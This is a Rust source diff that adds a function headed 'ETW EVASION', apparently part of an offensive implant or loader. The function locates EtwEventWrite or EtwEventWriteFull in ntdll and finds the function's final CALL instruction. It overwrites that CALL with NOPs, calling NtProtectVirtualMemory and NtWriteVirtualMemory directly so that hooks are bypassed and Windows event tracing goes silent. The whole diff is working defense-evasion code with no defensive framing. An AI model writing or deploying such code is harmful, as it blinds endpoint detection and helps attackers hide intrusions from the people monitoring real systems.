@@ -195,3 +195,88 @@ pub fn patch_etwp_event_write_full_start() -> Result<(), &'static str> {
     Ok(())
 }
 
+// =======================================================================================================
+// ETW EVASION: EtwpEventWrite Call Patch (NOPs)
+// =======================================================================================================
+
+#[cfg(feature = "EvasionETWpEventWrite2")]
+use windows_sys::Win32::Foundation::HANDLE;
+#[cfg(feature = "EvasionETWpEventWrite2")]
+use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+#[cfg(feature = "EvasionETWpEventWrite2")]
+use windows_sys::Win32::System::Threading::GetCurrentProcess;
+#[cfg(feature = "EvasionETWpEventWrite2")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "EvasionETWpEventWrite2")]
+#[derive(Eq, PartialEq)]
+pub enum Patch2 {
+    PatchEtwEventWrite,
+    PatchEtwEventWriteFull,
+}
+
+#[cfg(feature = "EvasionETWpEventWrite2")]
+const ETW_EVENT_WRITE_SIZE_2: usize = 0x1000;
+#[cfg(feature = "EvasionETWpEventWrite2")]
+const RET_INT3_OPCODE_2: &[u8] = 0xCCC3u16.to_le_bytes().as_slice();
+#[cfg(feature = "EvasionETWpEventWrite2")]
+const CALL_OPCODE_2: u8 = 0xE8;
+#[cfg(feature = "EvasionETWpEventWrite2")]
+const PATCH_SIZE_2: usize = 5;
+
+#[cfg(feature = "EvasionETWpEventWrite2")]
+pub fn patch_etwp_event_write_full_call(patch: Patch2) -> Result<(), &'static str> {
+    let func_name = match patch {
+        Patch2::PatchEtwEventWrite => b"EtwEventWrite\0".as_ptr(),
+        Patch2::PatchEtwEventWriteFull => b"EtwEventWriteFull\0".as_ptr(),
+    };
+
+    unsafe {
+        let ntdll_handle = GetModuleHandleA(b"NTDLL.dll\0".as_ptr());
+        let etw_fun_address = GetProcAddress(ntdll_handle, func_name);
+        let etw_fun_address = etw_fun_address.unwrap() as *mut u8;
+
+        let etw_event_write_buffer =
+            std::slice::from_raw_parts_mut(etw_fun_address, ETW_EVENT_WRITE_SIZE_2);
+
+        let end = match etw_event_write_buffer
+            .windows(RET_INT3_OPCODE_2.len())
+            .position(|w| w == RET_INT3_OPCODE_2)
+        {
+            None => return Err("Could not find end of function"),
+            Some(x) => x,
+        };
+
+        let call_offset = match etw_event_write_buffer[..end]
+            .iter()
+            .rposition(|b| *b == CALL_OPCODE_2)
+        {
+            None => return Err("Could not find"),
+            Some(a) => a,
+        };
+
+        // Get pointer to the CALL instruction (including the E8 opcode)
+        let call_instruction_ptr = etw_fun_address.add(call_offset);
+
+        // Create NOP patch (5 bytes to cover: E8 + 4 byte offset)
+        let nop_patch: [u8; PATCH_SIZE_2] = [0x90, 0x90, 0x90, 0x90, 0x90];
+
+        let mut patch_ptr = call_instruction_ptr as *mut c_void;
+        let mut size_to_set = PATCH_SIZE_2;
+        let mut return_value: i32;
+        let process_handle: HANDLE = GetCurrentProcess();
+        let mut oldprotect: u32 = 0;
+        let mut bytes_written: usize = 0;
+
+        // Change protection to RWX
+        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut patch_ptr, &mut size_to_set, 0x40, &mut oldprotect);
+        // Write NOP patch
+        let nop_ptr = nop_patch.as_ptr() as *const c_void;
+        return_value = syscall!("NtWriteVirtualMemory", process_handle, patch_ptr, nop_ptr, PATCH_SIZE_2, &mut bytes_written);
+        // Restore protection
+        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut patch_ptr, &mut size_to_set, oldprotect, &mut oldprotect);
+    }
+
+    Ok(())
+}
+
